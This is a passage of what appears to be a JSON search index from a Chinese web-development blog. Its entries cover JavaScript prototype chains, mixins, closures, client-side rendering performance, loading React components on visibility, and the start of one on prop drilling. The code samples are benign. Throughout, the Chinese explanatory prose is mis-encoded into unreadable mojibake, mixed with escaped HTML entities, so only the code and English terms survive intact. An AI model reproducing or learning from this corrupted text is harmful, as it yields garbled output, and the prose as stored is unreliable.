é€šè¿‡ä½¿ç”¨ä¸€ä¸ªä¸éœ€è¦é‡å†™çš„æ–¹æ³•ç›¸åŒçš„æ–¹æ³•åï¼Œå‘ ChildObject.prototype ä¸­æ·»åŠ æ–¹æ³•ã€‚\nè¯·çœ‹ä¸‹é¢çš„ä¸¾ä¾‹ï¼šBird é‡å†™äº†ä» Animal ç»§æ‰¿æ¥çš„ eat() æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12  function Animal() { } Animal.prototype.eat = function() { return \u0026#34;nom nom nom\u0026#34;; }; function Bird() { } Bird.prototype = Object.create(Animal.prototype); Bird.prototype.eat = function() { return \u0026#34;peck peck peck\u0026#34;; };   å¦‚æœä½ æœ‰ä¸€ä¸ªå®ä¾‹ï¼šlet duck = new Bird();ï¼Œç„¶åä½ è°ƒç”¨äº† duck.eat()ï¼Œä»¥ä¸‹å°±æ˜¯ JavaScript åœ¨ duck çš„ prototype é“¾ä¸Šå¯»æ‰¾æ–¹æ³•çš„è¿‡ç¨‹ï¼š\n duck =\u0026gt; eat() æ˜¯å®šä¹‰åœ¨è¿™é‡Œå—ï¼Ÿ ä¸æ˜¯ã€‚ Bird =\u0026gt; eat() æ˜¯å®šä¹‰åœ¨è¿™é‡Œå—ï¼Ÿ =\u0026gt; æ˜¯çš„ã€‚ æ‰§è¡Œå®ƒå¹¶åœæ­¢å¾€ä¸Šæœç´¢ã€‚ Animal =\u0026gt; è¿™é‡Œä¹Ÿå®šä¹‰äº† eat() æ–¹æ³•ï¼Œä½†æ˜¯ JavaScript åœ¨åˆ°è¾¾è¿™å±‚åŸå‹é“¾ä¹‹å‰å·²åœæ­¢äº†æœç´¢ã€‚ Object =\u0026gt; JavaScript åœ¨åˆ°è¾¾è¿™å±‚åŸå‹é“¾ä¹‹å‰ä¹Ÿå·²ç»åœæ­¢äº†æœç´¢ã€‚  \råå…­ã€ä½¿ç”¨ Mixin åœ¨ä¸ç›¸å…³å¯¹è±¡ä¹‹é—´æ·»åŠ å…±åŒè¡Œä¸º è¡Œä¸ºæ˜¯å¯ä»¥é€šè¿‡ç»§æ‰¿æ¥å…±äº«çš„ã€‚\nç„¶è€Œï¼Œåœ¨æœ‰äº›æƒ…å†µä¸‹ï¼Œç»§æ‰¿ä¸æ˜¯æœ€å¥½çš„è§£å†³æ–¹æ¡ˆã€‚\nç»§æ‰¿ä¸é€‚ç”¨äºä¸ç›¸å…³çš„å¯¹è±¡ï¼Œæ¯”å¦‚ Bird å’Œ Airplaneã€‚ è™½ç„¶å®ƒä»¬éƒ½å¯ä»¥é£è¡Œï¼Œä½†æ˜¯ Bird å¹¶ä¸æ˜¯ä¸€ç§ Airplaneï¼Œåä¹‹äº¦ç„¶ã€‚\nå¯¹äºä¸ç›¸å…³çš„å¯¹è±¡ï¼Œæ›´å¥½çš„æ–¹æ³•æ˜¯ä½¿ç”¨ mixinsã€‚\nmixin å…è®¸å…¶ä»–å¯¹è±¡ä½¿ç”¨å‡½æ•°é›†åˆã€‚\n1 2 3 4 5 6  let flyMixin = function(obj) { obj.fly = function() { console.log(\u0026#34;Flying, wooosh!\u0026#34;); } };   flyMixin èƒ½æ¥å—ä»»ä½•å¯¹è±¡ï¼Œå¹¶ä¸ºå…¶æä¾› fly æ–¹æ³•ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13  let bird = { name: \u0026#34;Donald\u0026#34;, numLegs: 2 }; let plane = { model: \u0026#34;777\u0026#34;, numPassengers: 524 }; flyMixin(bird); flyMixin(plane);   è¿™é‡Œçš„ flyMixin æ¥æ”¶äº†bird å’Œ plane å¯¹è±¡ï¼Œç„¶åå°† fly æ–¹æ³•åˆ†é…ç»™äº†æ¯ä¸€ä¸ªå¯¹è±¡ã€‚ ç°åœ¨ bird å’Œ plane éƒ½å¯ä»¥é£è¡Œäº†ï¼š\n1 2 3  bird.fly(); // Flying, wooosh! plane.fly(); // Flying, wooosh!   \råä¸ƒã€ä½¿ç”¨é—­åŒ…ä¿æŠ¤å¯¹è±¡å†…çš„å±æ€§ä¸è¢«å¤–éƒ¨ä¿®æ”¹ bird æœ‰ä¸€ä¸ªå…¬å…±å±æ€§ nameã€‚ å…¬å…±å±æ€§çš„å®šä¹‰å°±æ˜¯ï¼šå®ƒå¯ä»¥åœ¨ bird çš„å®šä¹‰èŒƒå›´ä¹‹å¤–è¢«è®¿é—®å’Œæ›´æ”¹ã€‚\n1 2  bird.name = \u0026#34;Duffy\u0026#34;;   å› æ­¤ï¼Œä»£ç çš„ä»»ä½•åœ°æ–¹éƒ½å¯ä»¥è½»æ¾åœ°å°† bird çš„ name å±æ€§æ›´æ”¹ä¸ºä»»æ„å€¼ã€‚\næƒ³æƒ³å¯†ç å’Œé“¶è¡Œè´¦æˆ·ä¹‹ç±»çš„ä¸œè¥¿ï¼Œå¦‚æœä»£ç åº“çš„ä»»ä½•éƒ¨åˆ†éƒ½å¯ä»¥è½»æ˜“æ”¹å˜ä»–ä»¬ã€‚ é‚£ä¹ˆå°†ä¼šå¼•èµ·å¾ˆå¤šé—®é¢˜ã€‚\nä½¿å±æ€§ç§æœ‰åŒ–æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯åœ¨æ„é€ å‡½æ•°ä¸­åˆ›å»ºå˜é‡ã€‚\nå¯ä»¥å°†è¯¥å˜é‡èŒƒå›´é™å®šåœ¨æ„é€ å‡½æ•°ä¸­ï¼Œè€Œä¸æ˜¯å…¨å±€å¯ç”¨ã€‚\nè¿™æ ·ï¼Œå±æ€§åªèƒ½ç”±æ„é€ å‡½æ•°ä¸­çš„æ–¹æ³•è®¿é—®å’Œæ›´æ”¹ã€‚\n1 2 3 4 5 6 7 8 9 10 11  function Bird() { let hatchedEgg = 10; this.getHatchedEggCount = function() { return hatchedEgg; }; } let ducky = new Bird(); ducky.getHatchedEggCount(); console.log(ducky.hatcheEgg) // undefined   è¿™é‡Œçš„ getHatchedEggCount æ˜¯ä¸€ç§ç‰¹æƒæ–¹æ³•ï¼Œå› ä¸ºå®ƒå¯ä»¥è®¿é—®ç§æœ‰å±æ€§ hatchedEggã€‚\nè¿™æ˜¯å› ä¸º hatchedEgg æ˜¯åœ¨ä¸ getHatchedEggCount ç›¸åŒçš„ä¸Šä¸‹æ–‡ä¸­å£°æ˜çš„ã€‚\nåœ¨ JavaScript ä¸­ï¼Œå‡½æ•°æ€»æ˜¯å¯ä»¥è®¿é—®åˆ›å»ºå®ƒçš„ä¸Šä¸‹æ–‡ã€‚ è¿™å°±å«åš é—­åŒ… closureã€‚\n\rçŸ¥è¯†ç‚¹   hasOwnProperty è·å–è‡ªèº«å±æ€§çš„æ–¹æ³•\n  prototype åŸå‹å±æ€§\n  isPrototypeOf éªŒè¯åŸå‹çš„å…³ç³»çš„æ–¹æ³•\n  å¦‚æœä¸ç”¨ä¼ å‚ï¼š Object.create(object) ä¼˜äº new å…³é”®å­—\n  constructor\n  closure é—­åŒ…\n  ","description":"æ€§èƒ½ä¼˜åŒ–","id":78,"section":"javascript","tags":null,"title":"åŸå‹","uri":"https://codthing.github.io/javascript/algorithms-data/object-programming/prototype/"},{"content":"åœ¨å®¢æˆ·ç«¯å‘ˆç° (CSR) ä¸­ï¼ŒæœåŠ¡å™¨ä»…å‘ˆç°é¡µé¢çš„å‡†ç³»ç»Ÿ HTML å®¹å™¨ã€‚ åœ¨é¡µé¢ä¸Šæ˜¾ç¤ºå†…å®¹æ‰€éœ€çš„é€»è¾‘ã€æ•°æ®è·å–ã€æ¨¡æ¿å’Œè·¯ç”±ç”±åœ¨æµè§ˆå™¨/å®¢æˆ·ç«¯ä¸­æ‰§è¡Œçš„ JavaScript ä»£ç å¤„ç†ã€‚ CSR ä½œä¸ºä¸€ç§æ„å»ºå•é¡µåº”ç”¨ç¨‹åºçš„æ–¹æ³•å˜å¾—æµè¡Œèµ·æ¥ã€‚ å®ƒæœ‰åŠ©äºæ¨¡ç³Šç½‘ç«™å’Œå·²å®‰è£…åº”ç”¨ç¨‹åºä¹‹é—´çš„åŒºåˆ«ã€‚\nä¸ºäº†æ›´å¥½åœ°äº†è§£å…¶ä»–æ¨¡å¼æä¾›çš„å¥½å¤„ï¼Œè®©æˆ‘ä»¬é¦–å…ˆæ·±å…¥äº†è§£å®¢æˆ·ç«¯æ¸²æŸ“ (CSR)ï¼Œå¹¶æ‰¾å‡ºå®ƒåœ¨å“ªäº›æƒ…å†µä¸‹å·¥ä½œå¾—å¾ˆå¥½ä»¥åŠå®ƒçš„ç¼ºç‚¹æ˜¯ä»€ä¹ˆã€‚\n\rCSR - åŸºæœ¬ç»“æ„ è€ƒè™‘è¿™ä¸ªä½¿ç”¨ React åœ¨é¡µé¢ä¸Šæ˜¾ç¤ºå’Œæ›´æ–°å½“å‰æ—¶é—´çš„ç®€å•ç¤ºä¾‹ã€‚\nHTML:\n\u0026lt;div id=\u0026#34;root\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; JS:\nfunction tick() {\rconst element = (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Hello, world!\u0026lt;/h1\u0026gt;\r\u0026lt;h2\u0026gt;It is {new Date().toLocaleTimeString()}.\u0026lt;/h2\u0026gt;\r\u0026lt;/div\u0026gt;\r);\rReactDOM.render(element,document.getElementById(\u0026#39;root\u0026#39;));\r}\rsetInterval(tick, 1000); HTML åªåŒ…å«ä¸€ä¸ªæ ¹ div æ ‡ç­¾ã€‚\nå¦ä¸€æ–¹é¢ï¼Œå†…å®¹æ˜¾ç¤ºå’Œæ›´æ–°å®Œå…¨åœ¨ JavaScript ä¸­å¤„ç†ã€‚ æ²¡æœ‰åˆ°æœåŠ¡å™¨çš„å¾€è¿”è¡Œç¨‹ï¼Œæ¸²æŸ“çš„ HTML å°±åœ°æ›´æ–°ã€‚\nåœ¨è¿™é‡Œï¼Œæ—¶é—´å¯ä»¥è¢«ä»»ä½•å…¶ä»–å®æ—¶ä¿¡æ¯æ›¿æ¢ï¼Œä¾‹å¦‚ä» API è·å–çš„æ±‡ç‡æˆ–è‚¡ç¥¨ä»·æ ¼ï¼Œå¹¶åœ¨ä¸åˆ·æ–°é¡µé¢æˆ–å¾€è¿”æœåŠ¡å™¨çš„æƒ…å†µä¸‹æ˜¾ç¤ºã€‚\n\rJavaScript åŒ…(bundles)å’Œæ€§èƒ½ éšç€é¡µé¢æ˜¾ç¤ºå›¾åƒã€æ˜¾ç¤ºæ•°æ®å­˜å‚¨ä¸­çš„æ•°æ®å’ŒåŒ…æ‹¬äº‹ä»¶å¤„ç†çš„å¤æ‚æ€§å¢åŠ ï¼Œå‘ˆç°é¡µé¢æ‰€éœ€çš„ JavaScript ä»£ç çš„å¤æ‚æ€§å’Œå¤§å°ä¹Ÿå°†å¢åŠ ã€‚\nCSR äº§ç”Ÿäº†å¤§é‡çš„ JavaScript åŒ…ï¼Œä»è€Œå¢åŠ äº†é¡µé¢çš„ FCP å’Œ TTIã€‚\nå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œéšç€ bundle.js çš„å¤§å°å¢åŠ ï¼ŒFCP å’Œ TTI è¢«å‘å‰æ¨ã€‚\nè¿™æ„å‘³ç€ç”¨æˆ·å°†åœ¨ FP å’Œ FCP ä¹‹é—´çš„æ•´ä¸ªæŒç»­æ—¶é—´å†…çœ‹åˆ°ä¸€ä¸ªç©ºç™½å±å¹•ã€‚\n\rä¼˜ç¼ºç‚¹ ä½¿ç”¨ Reactï¼Œå¤§éƒ¨åˆ†åº”ç”¨ç¨‹åºé€»è¾‘åœ¨å®¢æˆ·ç«¯æ‰§è¡Œï¼Œå®ƒé€šè¿‡ API è°ƒç”¨ä¸æœåŠ¡å™¨äº¤äº’ä»¥è·å–æˆ–ä¿å­˜æ•°æ®ã€‚\nå› æ­¤å‡ ä¹æ‰€æœ‰çš„ UI éƒ½æ˜¯åœ¨å®¢æˆ·ç«¯ä¸Šç”Ÿæˆçš„ã€‚ æ•´ä¸ª Web åº”ç”¨ç¨‹åºåœ¨ç¬¬ä¸€ä¸ªè¯·æ±‚æ—¶åŠ è½½ã€‚ å½“ç”¨æˆ·é€šè¿‡å•å‡»é“¾æ¥è¿›è¡Œå¯¼èˆªæ—¶ï¼Œä¸ä¼šå‘æœåŠ¡å™¨ç”Ÿæˆç”¨äºå‘ˆç°é¡µé¢çš„æ–°è¯·æ±‚ã€‚ è¯¥ä»£ç åœ¨å®¢æˆ·ç«¯ä¸Šè¿è¡Œä»¥æ›´æ”¹è§†å›¾/æ•°æ®ã€‚\nCSR å…è®¸æˆ‘ä»¬æ‹¥æœ‰ä¸€ä¸ªå•é¡µåº”ç”¨ç¨‹åºï¼Œè¯¥åº”ç”¨ç¨‹åºæ”¯æŒæ— éœ€é¡µé¢åˆ·æ–°çš„å¯¼èˆªå¹¶æä¾›å‡ºè‰²çš„ç”¨æˆ·ä½“éªŒã€‚\nç”±äºä¸ºæ›´æ”¹è§†å›¾è€Œå¤„ç†çš„æ•°æ®æœ‰é™ï¼Œå› æ­¤é¡µé¢ä¹‹é—´çš„è·¯ç”±é€šå¸¸ä¼šæ›´å¿«ï¼Œä»è€Œä½¿ CSR åº”ç”¨ç¨‹åºçœ‹èµ·æ¥æ›´å…·å“åº”æ€§ã€‚\nCSR è¿˜å…è®¸å¼€å‘äººå‘˜å®ç°å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä»£ç ä¹‹é—´çš„æ˜ç¡®åˆ†ç¦»ã€‚\nå°½ç®¡å®ƒæä¾›äº†å‡ºè‰²çš„äº¤äº’ä½“éªŒï¼Œä½†æ­¤ CSR ä»å­˜åœ¨ä¸€äº›ç¼ºé™·ã€‚\n  SEO è€ƒè™‘å› ç´ ï¼š\nå¤§å¤šæ•°ç½‘ç»œçˆ¬è™«å¯ä»¥ä»¥ç›´æ¥çš„æ–¹å¼è§£é‡ŠæœåŠ¡å™¨å‘ˆç°çš„ç½‘ç«™ã€‚\nåœ¨å®¢æˆ·ç«¯æ¸²æŸ“çš„æƒ…å†µä¸‹ï¼Œäº‹æƒ…ä¼šå˜å¾—ç¨å¾®å¤æ‚ä¸€äº›ï¼Œå› ä¸ºå¤§è´Ÿè½½å’Œå¤§é‡ç½‘ç»œè¯·æ±‚ï¼ˆä¾‹å¦‚ API å“åº”ï¼‰å¯èƒ½ä¼šå¯¼è‡´æœ‰æ„ä¹‰çš„å†…å®¹æ¸²æŸ“é€Ÿåº¦ä¸å¤Ÿå¿«ï¼Œçˆ¬è™«æ— æ³•å¯¹å…¶è¿›è¡Œç´¢å¼•ã€‚\nçˆ¬è™«å¯èƒ½ä¼šç†è§£ JavaScriptï¼Œä½†å­˜åœ¨å±€é™æ€§ã€‚å› æ­¤ï¼Œéœ€è¦ä¸€äº›å˜é€šæ–¹æ³•æ¥ä½¿å®¢æˆ·ç«¯å‘ˆç°çš„ç½‘ç«™ SEO å‹å¥½ã€‚\n  æ€§èƒ½ï¼š\né€šè¿‡å®¢æˆ·ç«¯æ¸²æŸ“ï¼Œäº¤äº’è¿‡ç¨‹ä¸­çš„å“åº”æ—¶é—´å¤§å¤§æé«˜ï¼Œå› ä¸ºæ²¡æœ‰åˆ°æœåŠ¡å™¨çš„å¾€è¿”ã€‚\nä½†æ˜¯ï¼Œå¯¹äºæµè§ˆå™¨ç¬¬ä¸€æ¬¡åœ¨å®¢æˆ·ç«¯å‘ˆç°å†…å®¹ï¼Œå®ƒä»¬å¿…é¡»ç­‰å¾… JavaScript é¦–å…ˆåŠ è½½å¹¶å¼€å§‹å¤„ç†ã€‚\nå› æ­¤ï¼Œç”¨æˆ·åœ¨åˆå§‹é¡µé¢åŠ è½½ä¹‹å‰ä¼šé‡åˆ°ä¸€äº›å»¶è¿Ÿã€‚\néšç€ JS åŒ…çš„å¤§å°å˜å¤§å’Œ/æˆ–å®¢æˆ·ç«¯æ²¡æœ‰è¶³å¤Ÿçš„å¤„ç†èƒ½åŠ›ï¼Œè¿™å¯èƒ½ä¼šå½±å“ç”¨æˆ·ä½“éªŒã€‚\n  ä»£ç å¯ç»´æŠ¤æ€§ï¼š\nä»£ç çš„æŸäº›å…ƒç´ å¯èƒ½ä¼šåœ¨ä¸åŒè¯­è¨€çš„å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ (API) ä¸­é‡å¤ã€‚\nåœ¨å…¶ä»–æƒ…å†µä¸‹ï¼Œå¯èƒ½æ— æ³•å®Œå…¨åˆ†ç¦»ä¸šåŠ¡é€»è¾‘ã€‚è¿™æ–¹é¢çš„ç¤ºä¾‹å¯èƒ½åŒ…æ‹¬è´§å¸å’Œæ—¥æœŸå­—æ®µçš„éªŒè¯å’Œæ ¼å¼åŒ–é€»è¾‘ã€‚\n  æ•°æ®è·å–ï¼š\nå¯¹äºå®¢æˆ·ç«¯å‘ˆç°ï¼Œæ•°æ®è·å–é€šå¸¸æ˜¯äº‹ä»¶é©±åŠ¨çš„ã€‚\nè¯¥é¡µé¢æœ€åˆå¯ä»¥åœ¨æ²¡æœ‰ä»»ä½•æ•°æ®çš„æƒ…å†µä¸‹åŠ è½½ã€‚\néšåå¯ä»¥ä½¿ç”¨ API è°ƒç”¨åœ¨å‘ç”Ÿé¡µé¢åŠ è½½æˆ–æŒ‰é’®ç‚¹å‡»ç­‰äº‹ä»¶æ—¶è·å–æ•°æ®ã€‚\næ ¹æ®æ•°æ®çš„å¤§å°ï¼Œè¿™å¯èƒ½ä¼šå¢åŠ åº”ç”¨ç¨‹åºçš„åŠ è½½/äº¤äº’æ—¶é—´ã€‚\n  è¿™äº›æ³¨æ„äº‹é¡¹çš„é‡è¦æ€§å¯èƒ½å› åº”ç”¨ç¨‹åºè€Œå¼‚ã€‚ å¼€å‘äººå‘˜é€šå¸¸å¯¹å¯»æ‰¾ SEO å‹å¥½çš„è§£å†³æ–¹æ¡ˆæ„Ÿå…´è¶£ï¼Œè¿™äº›è§£å†³æ–¹æ¡ˆå¯ä»¥åœ¨ä¸å½±å“äº¤äº’æ—¶é—´çš„æƒ…å†µä¸‹æ›´å¿«åœ°æä¾›é¡µé¢ã€‚ æ ¹æ®åº”ç”¨è¦æ±‚ï¼Œåˆ†é…ç»™ä¸åŒæ€§èƒ½æ ‡å‡†çš„ä¼˜å…ˆçº§å¯èƒ½ä¸åŒã€‚ æœ‰æ—¶ï¼Œä½¿ç”¨å®¢æˆ·ç«¯æ¸²æŸ“å¹¶è¿›è¡Œä¸€äº›è°ƒæ•´è€Œä¸æ˜¯é‡‡ç”¨å®Œå…¨ä¸åŒçš„æ¨¡å¼å¯èƒ½å°±è¶³å¤Ÿäº†ã€‚\n\ræå‡ CSR æ€§èƒ½ ç”±äº CSR çš„æ€§èƒ½ä¸ JavaScript åŒ…çš„å¤§å°æˆåæ¯”ï¼Œ\næˆ‘ä»¬èƒ½åšçš„æœ€å¥½çš„äº‹æƒ…å°±æ˜¯æ„å»ºæˆ‘ä»¬çš„ JavaScript ä»£ç ä»¥è·å¾—æœ€ä½³æ€§èƒ½ã€‚\nä»¥ä¸‹æ˜¯å¯ä»¥æä¾›å¸®åŠ©çš„æŒ‡é’ˆåˆ—è¡¨ã€‚\n  æŒ‰éœ€å‹ç¼©åŠ è½½ï¼š\nç¡®ä¿ä¸ºåˆå§‹é¡µé¢åŠ è½½æœ‰ä¸€ä¸ªåˆç†ç´§å¼ çš„ JavaScript é¢„ç®—ã€‚ ä¸€ä¸ªå°äº 100-170KB çš„å‹ç¼©åŒ…å’Œ gzip å‹ç¼©åŒ…æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„èµ·ç‚¹ã€‚ ç„¶åå¯ä»¥åœ¨éœ€è¦åŠŸèƒ½æ—¶æŒ‰éœ€åŠ è½½ä»£ç \n  é¢„åŠ è½½ï¼š\næ­¤æŠ€æœ¯å¯ç”¨äºåœ¨é¡µé¢ç”Ÿå‘½å‘¨æœŸçš„æ—©æœŸé¢„åŠ è½½é¡µé¢æ‰€éœ€çš„å…³é”®èµ„æºã€‚ å…³é”®èµ„æºå¯èƒ½åŒ…æ‹¬ JavaScriptï¼Œå¯ä»¥é€šè¿‡åœ¨ HTML çš„ \u0026lt;head\u0026gt; éƒ¨åˆ†ä¸­åŒ…å«ä»¥ä¸‹æŒ‡ä»¤æ¥é¢„åŠ è½½ã€‚\n  \u0026lt;link rel=\u0026#34;preload\u0026#34; as=\u0026#34;script\u0026#34; href=\u0026#34;critical.js\u0026#34;\u0026gt; è¿™ä¼šé€šçŸ¥æµè§ˆå™¨åœ¨é¡µé¢æ¸²æŸ“æœºåˆ¶å¯åŠ¨ä¹‹å‰å¼€å§‹åŠ è½½ critical.js æ–‡ä»¶ã€‚ è„šæœ¬å°†å› æ­¤æ›´æ—©å¯ç”¨å¹¶ä¸”ä¸ä¼šé˜»å¡é¡µé¢æ¸²æŸ“æœºåˆ¶ä»è€Œæé«˜æ€§èƒ½ã€‚\n å»¶è¿ŸåŠ è½½ï¼š\né€šè¿‡å»¶è¿ŸåŠ è½½ï¼Œå¯ä»¥è¯†åˆ«éå…³é”®èµ„æºå¹¶ä»…åœ¨éœ€è¦æ—¶åŠ è½½è¿™äº›èµ„æºã€‚\nä½¿ç”¨è¿™ç§æ–¹æ³•å¯ä»¥æ”¹è¿›åˆå§‹é¡µé¢åŠ è½½æ—¶é—´ï¼Œå› ä¸ºæœ€åˆåŠ è½½çš„èµ„æºå¤§å°å‡å°‘äº†ã€‚\nä¾‹å¦‚ï¼ŒèŠå¤©å°éƒ¨ä»¶ç»„ä»¶é€šå¸¸ä¸ä¼šåœ¨é¡µé¢åŠ è½½æ—¶ç«‹å³éœ€è¦ï¼Œå¯ä»¥å»¶è¿ŸåŠ è½½ã€‚\n  ä»£ç æ‹†åˆ†ï¼š\nä¸ºäº†é¿å…å¤§é‡çš„ JavaScript ä»£ç ï¼Œå¯ä»¥æ‹†åˆ†ä»£ç åŒ…ã€‚\nä»£ç æ‹†åˆ†å— Webpack ç­‰æ‰“åŒ…å™¨çš„æ”¯æŒï¼Œå¯ç”¨äºåˆ›å»ºå¤šä¸ªå¯åœ¨è¿è¡Œæ—¶åŠ¨æ€åŠ è½½çš„åŒ…ã€‚\nä»£ç æ‹†åˆ†è¿˜èƒ½å¤Ÿå»¶è¿ŸåŠ è½½ JavaScript èµ„æºã€‚\n  æœåŠ¡å·¥ä½œè€…çš„åº”ç”¨ç¨‹åºShellç¼“å­˜ï¼š\nè¿™é¡¹æŠ€æœ¯æ¶‰åŠç¼“å­˜åº”ç”¨ç¨‹åºå¤–å£³Shellï¼Œå®ƒæ˜¯æ”¯æŒç”¨æˆ·ç•Œé¢çš„æœ€å° HTMLã€CSS å’Œ JavaScriptã€‚ Service Worker å¯ç”¨äºç¦»çº¿ç¼“å­˜åº”ç”¨ç¨‹åºå¤–å£³ã€‚\nè¿™å¯¹äºæä¾›æœ¬æœºå•é¡µåº”ç”¨ç¨‹åºä½“éªŒéå¸¸æœ‰ç”¨ï¼Œå…¶ä¸­å‰©ä½™å†…å®¹æ ¹æ®éœ€è¦é€æ­¥åŠ è½½ã€‚\n  é€šè¿‡è¿™äº›æŠ€æœ¯ï¼ŒCSR å¯ä»¥å¸®åŠ©æä¾›æ›´å¿«çš„å•é¡µåº”ç”¨ç¨‹åºä½“éªŒï¼Œå¹¶å…·æœ‰ä¸é”™çš„ FCP å’Œ TTIã€‚\næ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†çœ‹åˆ°åœ¨æœåŠ¡å™¨ç«¯æ¸²æŸ“çš„å¦ä¸€ç«¯å¯ç”¨çš„å†…å®¹ã€‚\n\rçŸ¥è¯†ç‚¹  bundles FCP TTI FP FCP rel=\u0026ldquo;preload\u0026rdquo; as=\u0026ldquo;script\u0026rdquo;  ","description":"åœ¨å®¢æˆ·ç«¯å‘ˆç°åº”ç”¨ç¨‹åºçš„ UI","id":79,"section":"react-patterns","tags":null,"title":"å®¢æˆ·ç«¯æ¸²æŸ“","uri":"https://codthing.github.io/react-patterns/render-patterns/client-side-rendering/"},{"content":"é™¤äº†ç”¨æˆ·äº¤äº’ï¼Œç»å¸¸æœ‰åœ¨åˆå§‹é¡µé¢ä¸Šä¸å¯è§çš„ç»„ä»¶ã€‚\nä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­æ˜¯å»¶è¿ŸåŠ è½½åœ¨è§†å£ä¸­ä¸ç›´æ¥å¯è§çš„å›¾åƒï¼Œä½†åªæœ‰åœ¨ç”¨æˆ·å‘ä¸‹æ»šåŠ¨æ—¶æ‰ä¼šåŠ è½½ã€‚\nç”±äºä¸ä¼šç«‹å³è¯·æ±‚æ‰€æœ‰å›¾åƒï¼Œå› æ­¤å¯ä»¥å‡å°‘åˆå§‹åŠ è½½æ—¶é—´ã€‚\nå¯ä»¥å¯¹ç»„ä»¶åšåŒæ ·çš„äº‹æƒ…ï¼\nä¸ºäº†çŸ¥é“ç»„ä»¶å½“å‰æ˜¯å¦åœ¨è§†å£ä¸­ï¼Œ\nå¯ä»¥ä½¿ç”¨ IntersectionObserver APIï¼Œ\næˆ–è€… react-lazyload ã€ react-loadable-visibility æ¥å¿«é€Ÿä¸ºåº”ç”¨ç¨‹åºæ·»åŠ å¯è§æ€§çš„å¯¼å…¥ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  // components/ChatInput.js import React from \u0026#34;react\u0026#34;; import Send from \u0026#34;./icons/Send\u0026#34;; import Emoji from \u0026#34;./icons/Emoji\u0026#34;; import LoadableVisibility from \u0026#34;react-loadable-visibility/react-loadable\u0026#34;; const EmojiPicker = LoadableVisibility({ loader: () =\u0026gt; import(\u0026#34;./EmojiPicker\u0026#34;), loading: \u0026lt;p id=\u0026#34;loading\u0026#34;\u0026gt;Loading\u0026lt;/p\u0026gt; }); const ChatInput = () =\u0026gt; { const [pickerOpen, togglePicker] = React.useReducer(state =\u0026gt; !state, false); return ( \u0026lt;div className=\u0026#34;chat-input-container\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Type a message...\u0026#34; /\u0026gt; \u0026lt;Emoji onClick={togglePicker} /\u0026gt; {pickerOpen \u0026amp;\u0026amp; \u0026lt;EmojiPicker /\u0026gt;} \u0026lt;Send /\u0026gt; \u0026lt;/div\u0026gt; ); }; console.log(\u0026#34;ChatInput loading\u0026#34;, Date.now()); export default ChatInput;   æ¯å½“ EmojiPicker è¢«æ¸²æŸ“åˆ°å±å¹•ä¸Šæ—¶ï¼Œåœ¨ç”¨æˆ·ç‚¹å‡» Gif æŒ‰é’®åï¼Œreact-loadable-visibility ä¼šæ£€æµ‹åˆ° EmojiPicker å…ƒç´ åº”è¯¥åœ¨å±å¹•ä¸Šå¯è§ã€‚\nåªæœ‰è¿™æ ·ï¼Œå½“ç”¨æˆ·çœ‹åˆ°æ­£åœ¨æ¸²æŸ“çš„åŠ è½½ç»„ä»¶æ—¶ï¼Œå®ƒæ‰ä¼šå¼€å§‹å¯¼å…¥æ¨¡å—ã€‚\nè¿™ä¸ªå›é€€ç»„ä»¶è®©ç”¨æˆ·çŸ¥é“åº”ç”¨ç¨‹åºæ²¡æœ‰å†»ç»“ï¼šä»–ä»¬åªéœ€è¦ç­‰å¾…ä¸€å°æ®µæ—¶é—´æ¥åŠ è½½ã€è§£æã€ç¼–è¯‘å’Œæ‰§è¡Œæ¨¡å—ï¼\n\rçŸ¥è¯†ç‚¹   IntersectionObserver\n  react-lazyload\n  react-loadable-visibility\n  ","description":"å½“å®ƒä»¬åœ¨è§†å£ä¸­å¯è§æ—¶åŠ è½½éå…³é”®ç»„ä»¶","id":80,"section":"react-patterns","tags":null,"title":"å¯¼å…¥å¯è§æ€§","uri":"https://codthing.github.io/react-patterns/performance-patterns/import-on-visibility/"},{"content":"åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¸Œæœ›ä¸ºåº”ç”¨ç¨‹åºä¸­çš„è®¸å¤šï¼ˆå¦‚æœä¸æ˜¯å…¨éƒ¨ï¼‰ç»„ä»¶æä¾›å¯ç”¨æ•°æ®ã€‚\n\rå•å‘æ•°æ®æµ props å­˜åœ¨çš„é—®é¢˜ è™½ç„¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ props å°†æ•°æ®ä¼ é€’ç»™ç»„ä»¶ï¼Œä½†å¦‚æœåº”ç”¨ç¨‹åºä¸­çš„å‡ ä¹æ‰€æœ‰ç»„ä»¶éƒ½éœ€è¦è®¿é—® props çš„å€¼ï¼Œè¿™å¯èƒ½å¾ˆéš¾åšåˆ°ã€‚\næˆ‘ä»¬ç»å¸¸ä¼šå¾—åˆ°ä¸€äº›å«åš prop é’»å­”çš„ä¸œè¥¿ï¼Œå½“æˆ‘ä»¬å°† props å‘ä¸‹ä¼ é€’åˆ°ç»„ä»¶æ ‘æ—¶å°±æ˜¯è¿™ç§æƒ…å†µã€‚\né‡æ„ä¾èµ–äº props çš„ä»£ç å˜å¾—å‡ ä¹ä¸å¯èƒ½ï¼Œè€Œä¸”çŸ¥é“æŸäº›æ•°æ®æ¥è‡ªå“ªé‡Œä¹Ÿå¾ˆå›°éš¾ã€‚\nå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªåŒ…å«æŸäº›æ•°æ®çš„ App ç»„ä»¶ã€‚ åœ¨ç»„ä»¶æ ‘çš„æœ€ä¸‹æ–¹ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ª ListItemã€Header å’Œ Text ç»„ä»¶ï¼Œå®ƒä»¬éƒ½éœ€è¦è¿™äº›æ•°æ®ã€‚ ä¸ºäº†å°†è¿™äº›æ•°æ®ä¼ 